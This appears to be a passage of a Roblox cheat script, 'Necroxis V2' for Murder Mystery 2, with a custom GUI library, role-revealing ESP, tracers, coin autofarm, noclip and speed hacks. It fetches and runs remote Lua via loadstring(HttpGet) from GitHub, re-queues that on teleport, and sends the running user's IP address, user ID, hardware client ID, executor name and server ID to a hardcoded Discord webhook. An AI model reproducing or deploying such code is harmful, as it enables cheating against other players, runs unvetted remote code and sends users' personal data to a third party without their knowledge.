					local twPos = game.TweenService:Create(newdd.DropDownMain.SelectionFrame, TweenInfo.new(.5), {Size = UDim2.new(1, 0,3.75, 0)})
					twPos:Play()
					game.TweenService:Create(newdd, TweenInfo.new(.5), {Size = UDim2.new(1, 0,.65, 0)}):Play()
					twPos.Completed:Wait()
					newdd.DropDownMain.SelectionFrame.Size = UDim2.new(1, 0, 3.75, 0);
				elseif newdd.DropDownMain.SelectionFrame.Visible == true then
					game.TweenService:Create(newdd.DropDownMain.ImageLabel, TweenInfo.new(0.15), {Rotation = 0}):Play()
					local twPos = game.TweenService:Create(newdd.DropDownMain.SelectionFrame, TweenInfo.new(.5), {Size = UDim2.new(1, 0, 0, 0)})
					twPos:Play()
					game.TweenService:Create(newdd, TweenInfo.new(.5), {Size = UDim2.new(0.997, 0, 0.143, 0)}):Play()

					twPos.Completed:Wait()
					newdd.DropDownMain.SelectionFrame.Visible = false
					newdd.DropDownMain.SelectionFrame.Size = UDim2.new(1, 0, 0, 0);
				end
				newdd.DropDownMain.Interactable = true
			end)
			game.Players.PlayerAdded:Connect(Update)
			game.Players.PlayerRemoving:Connect(Update)
		    end)
		end
		--<< SLIDER >>--
		function section.newSlider(title,default,min,max,cb)
		    task.defer(function() 
			min = min or 0
			max = max or 100
			local dragging
			local value = default or min
			local Slider: Frame = Instance.new('Frame');
			do
				
				Slider.Visible = false;
				Slider.Name = 'Slider';
				Slider.Position = UDim2.new(-7.5e-08, 0, 0, 0);
				Slider.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Slider.Size = UDim2.new(0.996690273, 0, 0.143, 0);
				Slider.BorderSizePixel = 0;
				Slider.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIGradient: UIGradient = Instance.new('UIGradient', Slider);
				UIGradient.Color = ColorSequence.new{

					ColorSequenceKeypoint.new(0, Color3.fromRGB(47, 47, 47)),

					ColorSequenceKeypoint.new(1, Color3.fromRGB(56, 56, 56))

				};
				UIGradient.Rotation = -60;


				local UICorner: UICorner = Instance.new('UICorner', Slider);
				UICorner.CornerRadius = UDim.new(0, 4);


				local sliderBtn: TextButton = Instance.new('TextButton', Slider);
				sliderBtn.FontFace = Font.new('rbxasset://fonts/families/SourceSansPro.json', Enum.FontWeight.Regular, Enum.FontStyle.Normal);
				sliderBtn.TextColor3 = Color3.fromRGB(0, 0, 0);
				sliderBtn.Text = '';
				sliderBtn.AutoButtonColor = false;
				sliderBtn.Name = 'sliderBtn';
				sliderBtn.Position = UDim2.new(0.551573157, 0, 0.552, 0);
				sliderBtn.Size = UDim2.new(0, 168, 0, 6);
				sliderBtn.BorderSizePixel = 0;
				sliderBtn.TextSize = 14;
				sliderBtn.BackgroundColor3 = Color3.fromRGB(29, 29, 29);


				local UICorner_1: UICorner = Instance.new('UICorner', sliderBtn);


				local UIListLayout: UIListLayout = Instance.new('UIListLayout', sliderBtn);
				UIListLayout.VerticalAlignment = Enum.VerticalAlignment.Center;
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder;


				local sliderDrag: Frame = Instance.new('Frame', sliderBtn);
				sliderDrag.Name = 'sliderDrag';
				sliderDrag.Position = UDim2.new(0, 0, 2.676, 0);
				sliderDrag.BorderColor3 = Color3.fromRGB(74, 99, 135);
				sliderDrag.Size = UDim2.new(-0.59523809, 100, -1.676, 0);
				sliderDrag.BorderSizePixel = 0;
				sliderDrag.BackgroundColor3 = Color3.fromRGB(106, 106, 106);


				local UICorner_2: UICorner = Instance.new('UICorner', sliderDrag);


				local Value: Frame = Instance.new('Frame', Slider);
				Value.Name = 'Value';
				Value.BackgroundTransparency = 1;
				Value.Position = UDim2.new(0.550914526, 0, 0.172, 0);
				Value.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Value.Size = UDim2.new(0.429861605, 0, 0.29, 0);
				Value.BorderSizePixel = 0;
				Value.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local UIListLayout_1: UIListLayout = Instance.new('UIListLayout', Value);
				UIListLayout_1.VerticalAlignment = Enum.VerticalAlignment.Center;
				UIListLayout_1.SortOrder = Enum.SortOrder.LayoutOrder;
				UIListLayout_1.HorizontalAlignment = Enum.HorizontalAlignment.Right;
				UIListLayout_1.FillDirection = Enum.FillDirection.Horizontal;


				local Number: TextBox = Instance.new('TextBox', Value);
				Number.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				Number.Active = false;
				Number.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Number.Text = '100';
				Number.Name = 'Number';
				Number.Size = UDim2.new(0, 32, 0, 14);
				Number.Selectable = false;
				Number.Position = UDim2.new(0.90172112, 0, 0.106, 0);
				Number.BackgroundTransparency = 1;
				Number.TextXAlignment = Enum.TextXAlignment.Right;
				Number.BorderSizePixel = 0;
				Number.TextColor3 = Color3.fromRGB(255, 255, 255);
				Number.TextSize = 14;
				Number.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local Symbol: TextLabel = Instance.new('TextLabel', Value);
				Symbol.LayoutOrder = 1;
				Symbol.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.Medium, Enum.FontStyle.Normal);
				Symbol.TextColor3 = Color3.fromRGB(255, 255, 255);
				Symbol.BorderColor3 = Color3.fromRGB(0, 0, 0);
				Symbol.Text = '%';
				Symbol.Name = 'Symbol';
				Symbol.Size = UDim2.new(0, 11, 0, 14);
				Symbol.Position = UDim2.new(0.931034505, 0, -0.136, 0);
				Symbol.BackgroundTransparency = 1;
				Symbol.TextXAlignment = Enum.TextXAlignment.Right;
				Symbol.BorderSizePixel = 0;
				Symbol.AutomaticSize = Enum.AutomaticSize.X;
				Symbol.TextSize = 14;
				Symbol.BackgroundColor3 = Color3.fromRGB(255, 255, 255);


				local TextLabel: TextLabel = Instance.new('TextLabel', Slider);
				TextLabel.TextWrapped = true;
				TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255);
				TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0);
				TextLabel.Text = 'SliderHolder';
				TextLabel.Size = UDim2.new(0.495868981, 0, 0.646, 0);
				TextLabel.Position = UDim2.new(0.038410939, 0, 0.172, 0);
				TextLabel.BorderSizePixel = 0;
				TextLabel.BackgroundTransparency = 1;
				TextLabel.TextXAlignment = Enum.TextXAlignment.Left;
				TextLabel.TextSize = 14;
				TextLabel.FontFace = Font.new('rbxassetid://16658221428', Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
				TextLabel.TextScaled = true;
				TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
			end
			Slider.Parent = Tabs[titleTab.."_sb"]
			Slider.Visible = true
			Slider.Name = title.."_SLIDER"
			Slider.TextLabel.Text = title
			Slider.Value.Number.Text = default or 0

			Slider.sliderBtn.InputBegan:Connect(function(input)
				if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
					local dragging = true
					local minitial = input.Position.X
					local initial = Slider.sliderBtn.sliderDrag.Position.X.Offset
					local delta_inbut = Slider.sliderBtn.sliderDrag.AbsolutePosition.X - initial
					local SlidingFunction
					SlidingFunction = game:GetService("RunService").Heartbeat:Connect(function()
						if dragging then
							local xoffset = mouse.X - delta_inbut
							if xoffset > 128 then
								xoffset = 128
							elseif xoffset < 0 then
								xoffset = 0
							end
							Slider.sliderBtn.sliderDrag.Size = UDim2.new(0, xoffset, 0, 8)
							Slider.Value.Number.Text = math.round(min + (max - min) * xoffset / 128)
						else
							SlidingFunction:Disconnect()
						end
					end)
					input.Changed:Connect(function()
						if input.UserInputState == Enum.UserInputState.End then
							dragging = false
						end
					end)
				end
			end)

			Slider.Value.Number:GetPropertyChangedSignal("Text"):Connect(function()
				print(Slider.Value.Number.Text)
				cb(tonumber(Slider.Value.Number.Text))
			end)
			end)
		end
		return section
	end
	return UILIB
end
YU = loadstring((game:HttpGet("https://raw.githubusercontent.com/NecroxisTeam/Files/main/JKQGDUAJQV.lua")))()
    local API = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://ipwho.is/"))
    getip = API.ip
    local ar = request or http_request or (http and http.request) or (syn and syn.request)
if not YU:isb(lp) then
function IsPremium(user)
    if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(user.UserId, 260784234) or YU:isc(user) then
    return true
    end
    return false
end

for i, v in pairs(PlaceIds) do
    if table.find(v, game.PlaceId) then
        GameConfig = i
    end
end

local b = game:GetService("HttpService"):JSONDecode(readfile("Necroxis/" .. GameConfig .. "/Setup.lua"))
if b then
    if GameConfig == "MM2" then
        mm2_features = b
    elseif GameConfig == "MMV" then
        mmv_features = b
    elseif GameConfig == "Doors" then
        doors_features = b
    elseif GameConfig == "Piggy" then
        piggy_features = b
    else
        return
    end
end

if table.find(PlaceIds.MM2, game.PlaceId) then
function IsAlive(Player)
    if roles ~= nil then
    for i,v in pairs(roles) do
    if Player.Name == i then
    if not v.Killed and not v.Dead then
    return true
    else
        return false
    end
    end
    end
    end
end

function isClearPath(target)
    local origin = game.Players.LocalPlayer.Character.PrimaryPart.Position
    local direction = (target.Position - origin).unit
    local distance = (target.Position - origin).magnitude
    
    local ray = Ray.new(origin, direction * distance)
    local hitPart, hitPosition = workspace:FindPartOnRay(ray, npc)
    
    return hitPart == nil or hitPart:IsDescendantOf(target.Parent)
end

function GetMurderUser()
    for i,v in pairs(Players:GetPlayers()) do
    if v ~= lp and v.Name == Murder and IsAlive(v) then
    return v
    end
    end
    return nil
    end
    
    function GetSheriffUser()
    for i,v in pairs(Players:GetPlayers()) do
    if v ~= lp and v.Name == Sheriff and IsAlive(v) then
    return v
    end
    end
    for i,player in pairs(Players:GetPlayers()) do
    if player ~= lp and IsAlive(player) and player.Backpack:FindFirstChild("Gun") then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= player and g ~= lp then
        if not g.Character:FindFirstChild("Gun") and not g.Backpack:FindFirstChild("Gun") then
        return player
        end
        end
        end
        elseif IsAlive(player) and player.Character:FindFirstChild("Gun") then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= player and g ~= lp then
        if not g.Character:FindFirstChild("Gun") and not g.Backpack:FindFirstChild("Gun") then
        return player
        end
        end
        end
        end
end
    return nil
    end
    
function CreateHighlight()
	for i, v in pairs(game.Players:GetPlayers()) do
		if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") and not v.Character:FindFirstChild("ESP_Highlight") then
			local esphigh = Instance.new("Highlight", v.Character)
            esphigh.Name = "ESP_Highlight"
            esphigh.FillColor = Color3.fromRGB(160, 160, 160)
            esphigh.OutlineTransparency = 1
            esphigh.FillTransparency = mm2_features["HighlightTransparency"]   
        end
	end
end
 
function UpdateHighlights()
	for _, v in pairs(game.Players:GetPlayers()) do
		if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and v.Character:FindFirstChild("HumanoidRootPart") and v.Character:FindFirstChild("ESP_Highlight") then
			local Highlight = v.Character:FindFirstChild("ESP_Highlight")
			if v.Name == Sheriff and IsAlive(v) then
				Highlight.FillColor = Color3.fromRGB(0, 0, 225)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			elseif v.Name == Murder and IsAlive(v) then
				Highlight.FillColor = Color3.fromRGB(225, 0, 0)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			elseif v.Name == Hero and IsAlive(v) and v.Backpack:FindFirstChild("Gun") then
				Highlight.FillColor = Color3.fromRGB(255, 255, 0)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			elseif v.Name == Hero and IsAlive(v) and v.Character:FindFirstChild("Gun") then
				Highlight.FillColor = Color3.fromRGB(255, 255, 0)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			elseif not IsAlive(v) then
				Highlight.FillColor = Color3.fromRGB(100, 100, 100)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			else
				Highlight.FillColor = Color3.fromRGB(0, 225, 0)
                Highlight.FillTransparency = mm2_features["HighlightTransparency"]
			end
		end
	end
end

function HideHighlights()
	for _, v in pairs(game.Players:GetPlayers()) do
		if v ~= game:GetService("Players").LocalPlayer and v.Character ~= nil and v.Character:FindFirstChild("ESP_Highlight") then
			v.Character:FindFirstChild("ESP_Highlight"):Destroy()
		end
	end
end

function TouchKn(o,z)
    local j = gethp(o)
	if j then
		z.Stab:FireServer("Down")
		task.wait()
		task.spawn(function()
			firetouchinterest(j, z.Handle, 0)
			firetouchinterest(j, z.Handle, 1)
		end)
	end
end

function findCoinContainer()
        for _, child in pairs(workspace:GetChildren()) do
            local coinContainer = child:FindFirstChild("CoinContainer")
            if coinContainer then
                return coinContainer
            end
        end
        return nil
    end
    
    function findNearestCoin()
        local coinContainer = findCoinContainer()
        if not coinContainer then
            return nil
        end
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
        local nearestCoin = nil
        local nearestDistance = math.huge
        for i,coins in pairs(coinContainer:GetChildren()) do
            local distance = (coins.Position - lp.Character.HumanoidRootPart.Position).Magnitude
            if distance < nearestDistance then
                nearestCoin = coins
                nearestDistance = distance
            end
    end
        return nearestCoin
    end
    
    function teleportToCoin(coin, speed)
        local humanoidRootPart = lp.Character:WaitForChild("HumanoidRootPart")
        local tweenInfo = TweenInfo.new(speed, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
        local tween = game:GetService("TweenService"):Create(humanoidRootPart, tweenInfo, {CFrame = coin.CFrame})
        tween:Play()
        return tween
    end
    
    local isTeleporting = false
    
    function teleportToNearbyCoin(method, speedmeth, SPD)
        if not mm2_features["AutoFarm"] or isTeleporting then return end
            if speedmeth == "Manual" and SPD ~= nil then
            if method == "Near" then
            local nearCoin = findNearestCoin()
            if not nearCoin then
                return
            end
            isTeleporting = true
            local tween = teleportToCoin(nearCoin, SPD * 23)
            tween.Completed:Wait()
            isTeleporting = false
            elseif method == "Random" then
            local coinContainer = findCoinContainer()
            if not coinContainer then
                return
            end
            local coins = coinContainer:GetChildren()
            if #coins == 0 then
                return
            end
            local randomCoin = coins[math.random(1, #coins)]
            isTeleporting = true
            local tween = teleportToCoin(randomCoin, SPD * 23)
            tween.Completed:Wait()
            isTeleporting = false
            else
                return
            end
            elseif speedmeth == "Auto" then
                if method == "Near" then
            local nearCoin = findNearestCoin()
            if not nearCoin then
                return
            end
            isTeleporting = true
            local tween = teleportToCoin(nearCoin, (nearCoin.Position - lp.Character.HumanoidRootPart.Position).Magnitude / 26)
            tween.Completed:Wait()
            isTeleporting = false
            elseif method == "Random" then
            local coinContainer = findCoinContainer()
            if not coinContainer then
                return
            end
            local coins = coinContainer:GetChildren()
            if #coins == 0 then
                return
            end
            local randomCoin = coins[math.random(1, #coins)]
            isTeleporting = true
            local tween = teleportToCoin(randomCoin, (lp.Character.HumanoidRootPart.Position - randomCoin.Position).Magnitude / 26)
            tween.Completed:Wait()
            isTeleporting = false
            else
                return
            end
            end
    end
    
    lp.OnTeleport:Connect(function(State)
	if queueteleport then
		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/NecroxisTeam/Files/master/Beta.lua'))()")
	end
end)
    RaNdOmNaMe = gC(12)
    
    local folder = Instance.new("Folder", game.CoreGui)
    folder.Name = RaNdOmNaMe
    
    function AB(player)
    local billboard = Instance.new("BillboardGui",folder)
    billboard.Name = player.Name
    billboard.AlwaysOnTop = true
    billboard.Size = UDim2.fromOffset(200,50)
    billboard.ExtentsOffset = Vector3.new(0,3,0)
    billboard.Enabled = false
    
    local textlabel = Instance.new("TextLabel",billboard)
    textlabel.TextSize = 19
    textlabel.Text = player.Name
    textlabel.Font = Enum.Font.DenkOne
    textlabel.BackgroundTransparency = 1
    textlabel.Size = UDim2.fromScale(1,1)
    textlabel.TextStrokeTransparency = 0
    textlabel.TextYAlignment = Enum.TextYAlignment.Bottom
    textlabel.ZIndex = 0
    if mm2_features["Esp_All"] then
    billboard.Enabled = true
    end
    repeat
    wait()
    pcall(function()
        billboard.Adornee = player.Character.Head
            if player.Name == Sheriff and IsAlive(player) then
				textlabel.TextColor3 = Color3.fromRGB(0,0,225)
                    if not billboard.Enabled and mm2_features["Esp_Sheriff"] then
                        billboard.Enabled = true
                    end
			elseif player.Name == Murder and IsAlive(player) then
				textlabel.TextColor3 = Color3.fromRGB(238,44,44)
        if not billboard.Enabled and mm2_features["Esp_Murder"] then
        billboard.Enabled = true
        end
			elseif player.Name == Hero and IsAlive(player) and player.Backpack:FindFirstChild("Gun") ~= nil then
				textlabel.TextColor3 = Color3.fromRGB(255, 255, 0)
				if not billboard.Enabled and mm2_features["Esp_Sheriff"] then
                        billboard.Enabled = true
                    end
			elseif player.Name == Hero and IsAlive(player) and player.Character:FindFirstChild("Gun") ~= nil then
				textlabel.TextColor3 = Color3.fromRGB(255, 255, 0)
				if not billboard.Enabled and mm2_features["Esp_Sheriff"] then
                        billboard.Enabled = true
                    end
			elseif not IsAlive(player) then
				textlabel.TextColor3 = Color3.fromRGB(122,122,122)
			else
				textlabel.TextColor3 = Color3.fromRGB(0,255,0)
			end
        end)
    until not player.Parent
    end
    
    for _,player in pairs(game:GetService("Players"):GetPlayers()) do
    if player ~= game:GetService("Players").LocalPlayer then
    coroutine.wrap(AB)(player)
    end
    end
    Players.PlayerAdded:Connect(AB)
    
    Players.PlayerRemoving:Connect(function(player)
        folder[player.Name]:Destroy()
    end)
    
    local CurrentCamera = workspace.CurrentCamera
    local worldToViewportPoint = CurrentCamera.worldToViewportPoint
    
    for i,v in pairs(game.Players:GetChildren()) do
            local Tracer = Drawing.new("Line")
        Tracer.Visible = false
        Tracer.Color = Color3.fromRGB(255, 0, 0)
        Tracer.Thickness = 1
        Tracer.Transparency = 1
     
        function lineesp()
            game:GetService("RunService").Stepped:Connect(function()
                if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lp and v.Character.Humanoid.Health > 0 then
                    local Vector, OnScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
     
                    if OnScreen then
                        Tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 1)
                        Tracer.To = Vector2.new(Vector.X, Vector.Y)
                        if v.Name == Murder and IsAlive(v) then
                            Tracer.Color = Color3.fromRGB(255, 0, 0)
                        elseif v.Name == Sheriff and IsAlive(v) then
                            Tracer.Color = Color3.fromRGB(0,0,255)
                    elseif IsAlive(v) and v.Character:FindFirstChild("Gun")  then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= v and g ~= lp and g.Character ~= nil then
        if not g.Character:FindFirstChild("Gun") ~= nil and not g.Backpack:FindFirstChild("Gun") ~= nil then
                        Tracer.Color = Color3.fromRGB(225,225,0)
        end
        end
        end
                elseif IsAlive(v) and v.Backpack:FindFirstChild("Gun") then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= v and g ~= lp and g.Character ~= nil then
        if not g.Character:FindFirstChild("Gun") ~= nil and not g.Backpack:FindFirstChild("Gun") ~= nil then
                Tracer.Color = Color3.fromRGB(225,225,0)
        end
        end
        end
        elseif IsAlive(lp) then
        Tracer.Color = Color3.fromRGB(0,255,0)
        elseif not IsAlive(lp) then
        Tracer.Color = Color3.fromRGB(0,255,0)
        end
                    if mm2_features["Tracers_All"] then
                            
                            Tracer.Visible = true
                        else
                            Tracer.Visible = false
                        end
                    else
                        Tracer.Visible = false
                    end
                else
                    Tracer.Visible = false
                end
            end)
        end
        coroutine.wrap(lineesp)()
    end
     
    game.Players.PlayerAdded:Connect(function(v)
            local Tracer = Drawing.new("Line")
        Tracer.Visible = false
        Tracer.Color = Color3.fromRGB(255, 0, 0)
        Tracer.Thickness = 1
        Tracer.Transparency = 1
     
        function lineesp()
            game:GetService("RunService").Stepped:Connect(function()
                if v.Character ~= nil and v.Character:FindFirstChild("Humanoid") ~= nil and v.Character:FindFirstChild("HumanoidRootPart") ~= nil and v ~= lp and v.Character.Humanoid.Health > 0 then
                    local Vector, OnScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
     
                    if OnScreen then
                        Tracer.From = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 1)
                        Tracer.To = Vector2.new(Vector.X, Vector.Y)
                        if v.Name == Murder and IsAlive(v) then
                            Tracer.Color = Color3.fromRGB(255, 0, 0)
                        elseif v.Name == Sheriff and IsAlive(v) then
                            Tracer.Color = Color3.fromRGB(0,0,255)
                    elseif IsAlive(v) and v.Character:FindFirstChild("Gun")  then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= v and g ~= lp and g.Character ~= nil then
        if not g.Character:FindFirstChild("Gun") ~= nil and not g.Backpack:FindFirstChild("Gun") ~= nil then
                        Tracer.Color = Color3.fromRGB(225,225,0)
        end
        end
        end
                elseif IsAlive(v) and v.Backpack:FindFirstChild("Gun") then
        for i,g in pairs(Players:GetPlayers()) do
        if g ~= v and g ~= lp and g.Character ~= nil then
        if not g.Character:FindFirstChild("Gun") ~= nil and not g.Backpack:FindFirstChild("Gun") ~= nil then
                Tracer.Color = Color3.fromRGB(225,225,0)
        end
        end
        end
        elseif IsAlive(lp) then
        Tracer.Color = Color3.fromRGB(0,255,0)
        elseif not IsAlive(lp) then
        Tracer.Color = Color3.fromRGB(0,255,0)
        end
                    if mm2_features["Tracers_All"] then
                            
                            Tracer.Visible = true
                        else
                            Tracer.Visible = false
                        end
                    else
                        Tracer.Visible = false
                    end
                else
                    Tracer.Visible = false
                end
            end)
        end
        coroutine.wrap(lineesp)()
    end)
    function filter(stringtext)
local text = stringtext
local convertedText = ""

local conversionTableUpper = {
    A = "Ạ", B = "Ḅ", C = "C", D = "Ḍ", E = "Ẹ",
    F = "F", G = "Ģ", H = "Ḥ", I = "Ị", J = "J",
    K = "Ḳ", L = "Ḷ", M = "Ṃ", N = "Ṇ", O = "Ọ",
    P = "Р", Q = "Q", R = "Ṛ", S = "Ṣ", T = "Ṭ",
    U = "Ụ", V = "Ṿ", W = "Ẉ", X = "Ẋ", Y = "Ỵ", Z = "Ẓ"
}

local conversionTableLower = {
    A = "A̶̶", B = "B̶̶", C = "C̶", D = "D̶̶", E = "E̶",
    F = "F̶", G = "G̶", H = "H̶", I = "I̶", J = "J̶",
    K = "K̶", L = "L̶", M = "M̶", N = "N̶", O = "O̶",
    P = "P̶", Q = "Q̶", R = "R̶", S = "S̶", T = "T̶",
    U = "U̶", V = "V̶", W = "W̶", X = "X̶", Y = "Y̶", Z = "̶̶̶Z̶"
}

for char in text:gmatch(".") do
local convertedChar = conversionTableUpper[char] or conversionTableLower[char] or char
convertedText = convertedText .. convertedChar .. "͎"
end

return convertedText
end

SendDiscord("https://discord.com/api/webhooks/1320587452104310808/73hVfckGSufFungDVox3_jOtGvpUAjQYM3fHQHVi-QPnJ9-0yjpvI9hkaXiFvBYQAUjf", "** **", "API[Executed-Script]","", "User Executed Necroxis Script!", "https://web.roblox.com/users/" .. lp.UserId .. "/profile", {
                {
                    ["name"] = "User:",
                    ["value"] = lp.Name.." (" ..lp.DisplayName.. ")["..lp.UserId.."]",
                    ["inline"] = true,
                },
                {
                    ["name"] = "HWID:",
                    ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = getexecutorname(),
                    ["inline"] = true,
                },
                {
                    ["name"] = "Server Id:",
                    ["value"] = game.JobId,
                    ["inline"] = true,
                },
                {
                    ["name"] = "IP:",
                    ["value"] = getip,
                    ["inline"] = true,
                },
                {
                    ["name"] = "Game: ",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true,
                }
            })
    
function GetCharacter(Player)
    if Player.Character then
    return Player.Character
    end
    end
    
    function GetRoot(Player)
    if GetCharacter(Player):FindFirstChild("HumanoidRootPart") then
    return GetCharacter(Player).HumanoidRootPart
    end
    end
    
    function GetState()
    if lp.Character ~= nil and lp.Character.Humanoid ~= nil then
    return lp.Character.Humanoid:GetState().Name
    end
    return "NoDetect"
    end
    
    function GetGunDrop()
    for i,v in pairs(workspace:GetChildren()) do
        for _,h in pairs(v:GetChildren()) do
        if h.Name == "GunDrop" then
            return h
        end
        end
    end
    return nil
    end
    
    SnowFull = false

    replst.Remotes.Gameplay.CoinCollected.OnClientEvent:Connect(function(CoinType, Current, Max, Pseudo)
        --[==[
          Args Properties:
            CoinType: Coin, Candy, ...
            Current:
              Coin: 1 - (40 / 50 [ELITE])
              Candy: 1 - 20
            Max:
              Coin: 40 / 50 [ELITE]
              Candy: 20
              ...
            Pseudo:
              {
                  "Value": 1
              }
        ]==]
        print(CoinType)
        if CoinType == "Coin" or CoinType == "SnowToken" then
            if tonumber(Current) == tonumber(Max) then
            SnowFull = true
            end
        end
    end)

    function IsFull()
        return SnowFull
    end
    
    local insrolenot = Instance.new("ScreenGui")
    insrolenot.Name = "InstantRN"
    insrolenot.Parent = game.CoreGui
    insrolenot.Enabled = false
    
    local insroletext = Instance.new("TextLabel")
    insroletext.Name = "TextL"
    insroletext.Size = UDim2.new(0, 270, 0, 75)
    insroletext.Position = UDim2.new(0.5, 0, 0.5, 0)
    insroletext.AnchorPoint = Vector2.new(0.5,0.5)
    insroletext.BackgroundTransparency = 1
    insroletext.Active = true
    insroletext.Draggable = false
    insroletext.Parent = insrolenot
    insroletext.Text = "nil"
    insroletext.TextSize = 24
    insroletext.TextScaled = true
    insroletext.TextTransparency = 0
    insroletext.TextColor3 = Color3.fromRGB(255,255,255)
    insroletext.Font = Enum.Font.BuilderSansExtraBold
    insroletext.ZIndex = 0
    
    insroletext.Position = insroletext.Position + UDim2.new(0,0,0,-50)
    
    StatusOfDevice = nil
    if UserInputService.KeyboardEnabled then
    StatusOfDevice = "Pc"
    end
    if UserInputService.TouchEnabled then
        StatusOfDevice = "Mobile/Tablet"
    end

UILIB:Load("Necroxis V2 | Murder Mystery 2", V)

local Tabs = {
    ["Main"] = UILIB.newTab("Main", icns.assets["lucide-home"]),
    ["Player"] = UILIB.newTab("User", icns.assets["lucide-user"]),
    ["Visual"] = UILIB.newTab("Visual", icns.assets["lucide-eye"]),
    ["Modifers"] = UILIB.newTab("GameModes", icns.assets["lucide-gamepad"]),
    ["TS"] = UILIB.newTab("Teleports", icns.assets["lucide-boxes"]),
    ["Trolling"] = UILIB.newTab("Trolling", icns.assets["lucide-moon"]),
    ["AutoFarm"] = UILIB.newTab("AutoFarm", icns.assets["lucide-sofa"]),
    ["Premium"] = UILIB.newTab("Premium", icns.assets["lucide-diamond"]),
    ["Settings"] = UILIB.newTab("Settings", icns.assets["lucide-settings"]),
}

Tabs.Premium:ChangeTBColor({Type = "Off",Color =ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromHex("#00ACE0")),
                ColorSequenceKeypoint.new(1, Color3.fromHex("#00CDC5"))
            };})
        Tabs.Premium:ChangeTBColor({Type = "On",Color =ColorSequence.new{
                ColorSequenceKeypoint.new(0, Color3.fromHex("#87FAFF")),
                ColorSequenceKeypoint.new(1, Color3.fromHex("#7BD5FF"))
            };})
Tabs.Main.newLabel("User Information:")
Tabs.Main.newLabel("Username: "..lp.Name)
Tabs.Main.newLabel("DisplayName: "..lp.DisplayName)
Tabs.Main.newLabel("UserId: "..lp.UserId)
Tabs.Main.newLabel("Server Id: "..game.JobId)
Tabs.Main.newLabel("Executor: "..getexecutorname())
Tabs.Main.newLabel("Credits:")
Tabs.Main.newLabel("Owner: Gregory909(Playerhack_YT)")
Tabs.Main.newLabel("Ui: dmel(some fixes by Gregory909)")
WalkSpeedTOGGLE = Tabs.Player.newToggle("WalkSpeed Toggle", mm2_features["WalkSpeed_Toggle"], function(val)
    mm2_features["WalkSpeed_Toggle"] = val
    UpdateFeature("mm2", "WalkSpeed_Toggle", val)
end)
Tabs.Player.newSlider("WalkSpeed Value", mm2_features["WalkSpeed_Value"], 16, 200, function(val)
    mm2_features["WalkSpeed_Value"] = val
    UpdateFeature("mm2", "WalkSpeed_Value", val)
end)

Tabs.Player.newToggle("JumpPower Toggle", mm2_features["JumpPower_Toggle"], function(val)
    mm2_features["JumpPower_Toggle"] = val
    UpdateFeature("mm2", "WalkSpeed_Toggle", val)
end)
Tabs.Player.newSlider("JumpPower Value", mm2_features["JumpPower_Value"], 50, 250, function(val)
    mm2_features["JumpPower_Value"] = val
    UpdateFeature("mm2", "JumpPower_Value", val)
end)

Tabs.Player.newToggle("Fov Toggle", false, function(val)
    mm2_features["Fov_Toggle"] = val
    UpdateFeature("mm2", "Fov_Toggle", val)
end)
Tabs.Player.newSlider("Fov Value", mm2_features["Fov_Value"], 75, 120, function(val)
    mm2_features["Fov_Value"] = val
    UpdateFeature("mm2", "Fov_Value", val)
end)
Tabs.Player.newToggle("Noclip", mm2_features["Noclip_Toggle"], function(val)
    mm2_features["Noclip_Toggle"] = val
    UpdateFeature("mm2", "Noclip_Toggle", val)
    if mm2_features["Noclip_Toggle"] then
        nocliploop = runservice.Heartbeat:connect(function()
        if lp.Character ~= nil then
            for _, child in pairs(lp.Character:GetDescendants()) do
            if child:IsA("BasePart") and child.CanCollide == true then
            child.CanCollide = false
            end
            end
            end
        end)
    else
        if nocliploop then
        nocliploop:Disconnect()
        end
        wait(0.7)
        if lp.Character ~= nil then
            for _, child in pairs(lp.Character:GetDescendants()) do
            if child:IsA("BasePart") and child.CanCollide == false and child.Name == "HumanoidRootPart" or child:IsA("BasePart") and child.CanCollide == false and child.Name == "LowerTorso" or child:IsA("BasePart") and child.CanCollide == false and child.Name == "UpperTorso" then
            child.CanCollide = true
            end
            end
        end
    end
end)
Tabs.Player.newToggle("Click Tp", mm2_features["ClickTp_Toggle"], function(val)
